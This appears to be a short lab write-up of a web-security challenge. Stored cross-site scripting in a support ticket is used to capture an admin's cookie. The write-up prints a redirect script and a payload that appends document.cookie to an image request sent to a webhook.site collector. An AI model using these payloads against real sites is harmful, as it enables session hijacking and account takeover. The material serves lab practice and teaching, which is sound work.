# Challange

### In the challenge scenario, there is a support portal and an admin panel, and the objective is to steal the admin's cookie.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/f443c8ad-7e65-4057-a52e-e423ad10c67e)

- In the ticket section, I utilized a payload `<script>window.location.href='<webhook site Url'</script>` that redirects the admin to `webhook.site`. This allows me to steal the admin's ID from the intercepted request on `webhook.site`.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/32d2f138-7508-4b45-a8cb-667df4850f87)

- Upon logging into the admin panel, an automatic redirection occurs, leading you to a specific URL.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/6439ac6e-fab2-413b-aca9-74aa4c03986d)


- In this payload `<script> var i=new Image; i.src="<webhook.site URL>"+document.cookie;</script>`, I included code to fetch an image from a specified URL. This code also resulted in the cookies being exposed and displayed on the webhook site, allowing me to capture and analyze them.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/510ae650-b043-4798-bfed-a388be10f78c)


- Upon inspecting the results in the webhook.site, we observed the captured information and data that was obtained through the payload and cookies.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/059da415-69dd-4122-bd25-6a5c941d301b)
